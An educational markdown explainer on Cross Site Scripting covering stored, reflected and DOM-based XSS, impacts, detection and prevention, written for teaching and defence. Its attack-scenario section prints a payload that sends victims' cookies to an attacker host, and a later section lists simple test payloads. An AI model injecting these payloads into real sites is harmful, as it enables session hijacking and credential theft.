\# Cross Site Scripting (XSS)



\## Overview



Cross Site Scripting (XSS) is a web application vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.



XSS attacks typically use JavaScript to execute malicious actions inside a victim’s browser.



XSS is included in the OWASP Top 10 because it can lead to:

\- session hijacking

\- credential theft

\- malicious redirects

\- website defacement



\---



\## How XSS Works



Web applications that improperly handle user input may allow attackers to inject scripts into pages.



Example payload:



```html

<script>alert('XSS')</script>

```



If the application reflects or stores this input without sanitization, the script executes in the victim’s browser.



\---



\## Types of XSS



\### 1. Stored XSS



Malicious scripts are permanently stored on the server.



Examples:

\- forum posts

\- comments

\- profile fields



Victims execute the script when viewing the page.



\---



\### 2. Reflected XSS



The payload is reflected immediately in the server response.



Commonly found in:

\- search parameters

\- error messages

\- URL inputs



\---



\### 3. DOM-Based XSS



The vulnerability exists in client-side JavaScript code rather than server-side processing.



The browser modifies the DOM using unsafe input handling.



\---



\## Example Attack Scenario



An attacker injects:



```html

<script>

document.location='http://attacker.com/steal?cookie='+document.cookie

</script>

```



This can steal session cookies from victims.



\---



\## Common Impacts



XSS attacks may lead to:

\- session hijacking

\- credential theft

\- phishing attacks

\- malicious redirects

\- account compromise



\---



\## Detection Techniques



Security analysts may identify XSS through:

\- unusual scripts in requests

\- suspicious URL parameters

\- browser alerts

\- abnormal application behavior



\---



\## Common Testing Payloads



Examples:



```html

<script>alert(1)</script>

```



```html

<img src=x onerror=alert(1)>

```



```html

<svg onload=alert(1)>

```



\---



\## Prevention Techniques



\### Input Validation



Validate and sanitize user input before processing.



\---



\### Output Encoding



Encode output before rendering data in HTML pages.



\---



\### Content Security Policy (CSP)



CSP helps restrict script execution and reduce XSS impact.



\---



\### HttpOnly Cookies



HttpOnly cookies reduce the risk of cookie theft through JavaScript.



\---



\## Secure Development Practices



Developers should:

\- avoid unsafe JavaScript functions

\- sanitize inputs

\- use modern frameworks securely

\- validate all user-controlled data



\---



\## XSS in Penetration Testing



Penetration testers commonly test:

\- forms

\- URL parameters

\- comment sections

\- search boxes



Tools used:

\- Burp Suite

\- OWASP ZAP

\- browser developer tools



\---



\## Importance in Cybersecurity



Understanding XSS is important for:

\- web security testing

\- secure application development

\- SOC investigations

\- vulnerability assessments



\---



\## Conclusion



Cross Site Scripting is a major web application vulnerability that can compromise user sessions and application security. Proper input handling, output encoding, and secure coding practices are essential to defend against XSS attacks.

